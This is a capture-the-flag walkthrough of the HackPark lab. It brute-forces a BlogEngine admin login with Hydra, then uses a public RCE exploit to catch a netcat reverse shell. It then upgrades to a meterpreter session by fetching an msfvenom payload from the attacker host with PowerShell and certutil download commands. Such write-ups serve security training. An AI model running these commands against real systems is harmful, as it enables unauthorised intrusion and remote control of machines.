We begin by brute-forcing the login page we found during our enumeration. We make use of Hydra. A bit of Googling reverse that one possible form of Hydra attack for an http-form POST request is:

```bash
hydra -l <username> -P <password list> $ip http-form-post "<path to login form>:<http post request body>:<invalid login pattern>" -V
```

For this to work, we need a few parameters:

- `<username>`: In this case, this is just admin.
- `<password list>`: We have a few choices here. We'll make use of the usual rockyou.txt password list.
- `$ip$`: This is the IP of the target machine.
- `<http post request body>`: This is the body of the HTTP post request we found using Burp. In general, we need to replace at least one of the username or password fields in the request body with `^USER^` or `^PASS^`, respectively. Since in this case we know the username, we can just use the password string.
- `<invalid login pattern>`: This is a string which Hydra will use to identify a failed login. We can test this directly on the login page and we find that "Login Failed" is the phrase returned for a failed login attempt.

Putting this together, the final command then becomes:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.0.19 http-post-form "/Account/login.aspx:__VIEWSTATE=VCLL4AD5hj4eU3c7OwZCMFSLrZgnuwNWwqU14ymrpSECMRMEss1jMVYmVb67U%2FpsBcK4tYfVcmqrQ%2B95Jw3qZzSMDHpPIKoIenuCluq6CFcmlVtKvP9qEozi293OcTTtm4qs%2Bf2KgjvhxZRnGxbLjaieg4PILs7zGesG7KaJ0cBNnJCJ&__EVENTVALIDATION=uri6bSKQN1p12IRWrOAPflhnCzioDymlveM9EI3FTCbZDuejIqx1mmjj1frSwFIxJVP67K%2BbeYtAFGpcmnK3vS7Fnnht8ZBu1RwEyFOmtErPCc0hDk71fYe4aqxdDJL%2BzggAaduPYQgoTwhO7cB9U7vuIHO7QtDBD6hYfu5TumyNHhLp&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -V
```

<center>

![e9040c88c5d9d7bd978ab69d4fcf28ca.png](HackPark/_resources/e9040c88c5d9d7bd978ab69d4fcf28ca-1.png)

</center>

After a short while (about 1400 attempts), we obtain the password to the admin account.

<center>

![e787b6c51985dc37e38b1ac38853b00d.png](HackPark/_resources/e787b6c51985dc37e38b1ac38853b00d-1.png)

</center>

Now that we have access to the admin account, we want to find a vulnerability which we can exploit to gain an initial foothold. Navigating to the admin page via the sidebar and then locating the about page reveals the version of BlogEngine.

<center>

![c0b94d9a6ccaf6773f8290789f22ea26.png](HackPark/_resources/c0b94d9a6ccaf6773f8290789f22ea26-1.png)

</center>

Searching for "Blog Engine 3.3.6" on exploit DB gives us a few options; we will use [this exploit](https://www.exploit-db.com/exploits/46353) for remote code execution. Download the exploit and open the code in Mousepad. We need to change the TcpClient IP to the attacker IP. We will listen on the indicated port (in this case, I've chosen port 9999).

<center>

![24c39b9e1c067839ba50736b1bdd57ae.png](HackPark/_resources/24c39b9e1c067839ba50736b1bdd57ae-1.png)

</center>

Start a netcat listener on the attacking machine.

<center>

![f81b1fd29f92bd75ef391547a6f8a90e.png](HackPark/_resources/f81b1fd29f92bd75ef391547a6f8a90e-1.png)

</center>

We will run the exploit by following the instructions given in the C# file. Look for a published post using the admin dashboard and click on it to begin editing.

<center>

![2481f63928dad8cff301cb68653c3645.png](HackPark/_resources/2481f63928dad8cff301cb68653c3645-1.png)

</center>

In the editor, click on the folder icon to open the file manager. Then rename the C# file to `PostView.ascx` and upload it.

<center>

![54df4778576ce55f5a526059f55af926.png](HackPark/_resources/54df4778576ce55f5a526059f55af926-1.png)

</center>

We then trigger the file by navigating to `10.10.0.19/?theme=HackPark/App_Data/files`. Going back to our netcat listener, we see that we've caught a reverse shell.

<center>

![2142b8b7632e79fef82e5eec0c0c9b33.png](HackPark/_resources/2142b8b7632e79fef82e5eec0c0c9b33-1.png)

</center>

Since our shell is unstable, we will pivot from netcat to a meterpreter session. Start by generating a reverse shell payload with msfvenom.

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.30.43 LPORT=9999 -f exe -o hackparkshell.exe
`

We then open a web server with `python3 -m http.server` within the directory containing the reverse shell executable. Meanwhile, in our netcat session we navigate to `C:\Windows\Temp` (since we don't seem to have write permissions elsewhere) and run the following command to download the msfvenom reverse shell payload.
```powershell
powershell -command "Invoke-WebRequest -OutFile shell.exe -Uri 10.6.30.43:8000/hackparkshell.exe"
```

We can also use the following command to download files onto a Windows machine.
```powershell
certutil.exe -urlcache -f http://10.6.30.43/hackparkshell.exe shell.exe
```

In another terminal window, we open up Metasploit to set up the reverse handler. We use  ``use exploit/multi/handler`` and we set the following options:

<center>

![e18242f0bff037e0f026b24a82b01662.png](HackPark/_resources/e18242f0bff037e0f026b24a82b01662-1.png)

</center>

Now ``run``  to start the reverse TCP handler. Back in our netcat session, we execute the shell with `shell.exe`. This will give us our meterpreter shell.